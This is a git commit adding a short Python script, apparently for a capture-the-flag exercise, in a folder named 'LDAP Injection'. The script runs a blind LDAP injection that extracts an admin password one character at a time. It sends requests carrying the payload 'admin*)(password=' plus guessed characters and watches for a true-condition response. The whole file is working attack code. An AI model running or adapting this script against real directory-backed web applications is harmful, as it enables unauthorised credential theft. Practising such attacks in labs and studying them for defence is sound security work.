6d663f70d4ff47df565a2ac08ef08937a138a0e1
Manish Sharma <62472469+sh377c0d3@users.noreply.github.com>
2021-12-13 19:54:10 +0530

    Create special_bind_ldap.py

---
+++ LDAP Injection/special_bind_ldap.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python3
+
+'''
+Without *
+'''
+
+import requests, string
+alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+
+flag = ""
+for i in range(50):
+    print("[i] Looking for number " + str(i))
+    for char in alphabet:
+        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
+        if ("TRUE CONDITION" in r.text):
+            flag += char
+            print("[+] Flag: " + flag)
+            break
